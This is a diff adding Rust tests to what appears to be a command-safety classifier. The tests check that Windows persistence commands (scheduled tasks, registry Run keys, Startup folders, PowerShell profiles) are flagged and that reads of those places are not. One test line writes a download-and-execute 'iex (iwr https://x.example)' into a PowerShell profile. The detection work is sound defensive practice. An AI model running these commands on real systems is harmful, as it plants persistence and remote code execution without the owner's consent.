@@ -5104,3 +5104,84 @@ fn issue_1269_git_config_attached_values_are_not_editor_options() {
         );
     }
 }
+
+/// #1261 (D168): Windows places and commands that run code later (scheduled
+/// tasks, registry Run keys, the Startup folders, PowerShell profiles) are
+/// persistence on Windows, as cron, launchd and shell start-up files are
+/// elsewhere. Runs on every platform.
+#[test]
+fn issue_1261_windows_persistence_is_protected() {
+    use ProtectedActionKind::Persistence;
+    for line in [
+        r"schtasks /create /tn x /tr C:\work\x.exe /sc onlogon",
+        r"schtasks.exe /Change /TN x /TR C:\work\y.exe",
+        r"C:\Windows\System32\schtasks.exe -create -tn x -tr y -sc daily",
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\work\x.exe",
+        r#"reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v x /d y /f"#,
+        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v x /d y",
+        r"reg add HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /f",
+        "reg import settings.reg",
+        r"reg.exe restore HKCU\Software saved.hiv",
+        "regedit /s settings.reg",
+        r#"copy x.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\x.bat""#,
+        r#"copy x.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\x.lnk""#,
+        r"echo x >> %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r"copy task.xml C:\Windows\System32\Tasks\x",
+    ] {
+        assert_eq!(cmd(line), Some(Persistence), "cmd /c {line}");
+    }
+    for line in [
+        "Register-ScheduledTask -TaskName x -Action $a -Trigger $t",
+        "Set-ScheduledTask -TaskName x -Action $a",
+        "Register-ScheduledJob -Name x -ScriptBlock { iwr x }",
+        "$s = New-Object -ComObject Schedule.Service",
+        r"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name x -Value 'C:\work\x.exe'",
+        r"New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name x -Value y",
+        r"New-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name x -Value y",
+        r"Set-Location HKCU:\Software\Microsoft\Windows\CurrentVersion\Run; New-ItemProperty -Path . -Name x -Value y",
+        r"& reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y",
+        "Add-Content $PROFILE 'iex (iwr https://x.example)'",
+        "'x' | Out-File -Append $profile.CurrentUserAllHosts",
+        "New-Item -ItemType File -Force -Path $PROFILE",
+        r#"Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\x.cmd" 'x'"#,
+        r#"Copy-Item x.ps1 "$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive\Documents\WindowsPowerShell\Modules\m""#,
+        r#"Copy-Item -Recurse m "$HOME\OneDrive - Contoso\Documents\PowerShell\Modules\m""#,
+        r"Remove-Item -Recurse $HOME\Documents\WindowsPowerShell",
+        r"Copy-Item x.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",
+        r"Copy-Item x.ps1 'C:\Program Files\PowerShell\7\Microsoft.PowerShell_profile.ps1'",
+    ] {
+        assert_eq!(powershell(line), Some(Persistence), "{line}");
+    }
+}
+
+/// #1261 (D168): reading those places, and ordinary work near them, is not
+/// persistence.
+#[test]
+fn issue_1261_windows_persistence_reads_are_not_protected() {
+    for line in [
+        "schtasks /query /tn x",
+        r"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Run run.reg",
+        r"type %USERPROFILE%\Documents\WindowsPowerShell\profile.ps1",
+        r#"dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup""#,
+        r"copy notes.txt %USERPROFILE%\Documents\notes.txt",
+        "echo run the tests",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+    for line in [
+        r"Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        r"Test-Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+        "Get-ScheduledTask",
+        "Get-Content $PROFILE",
+        "Test-Path $PROFILE",
+        "Write-Output $PROFILE",
+        r"Write-Output 'see CurrentVersion\Run'",
+        r"Set-Content -Path $HOME\Documents\notes.txt -Value x",
+        "cargo run --release",
+    ] {
+        assert_eq!(powershell(line), None, "{line}");
+    }
+}
